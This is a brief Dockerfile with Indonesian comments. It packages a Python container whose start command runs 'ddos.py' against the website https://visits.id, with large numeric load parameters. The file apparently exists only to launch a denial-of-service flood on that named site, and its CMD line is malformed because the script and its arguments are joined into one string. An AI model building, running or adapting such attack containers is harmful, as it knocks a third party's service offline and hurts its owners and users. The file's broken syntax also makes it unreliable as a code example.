# Gunakan image Python terbaru
FROM python:latest  

# Set direktori kerja di dalam container
WORKDIR /app  

# Salin semua file ke dalam container
COPY . .  

# Install dependencies (pastikan ada `requirements.txt`)
RUN pip install yarl  

# Jalankan aplikasi (misal `script.py`)
CMD ["python", "ddos.py https://visits.id 1600 800 10000000000"]
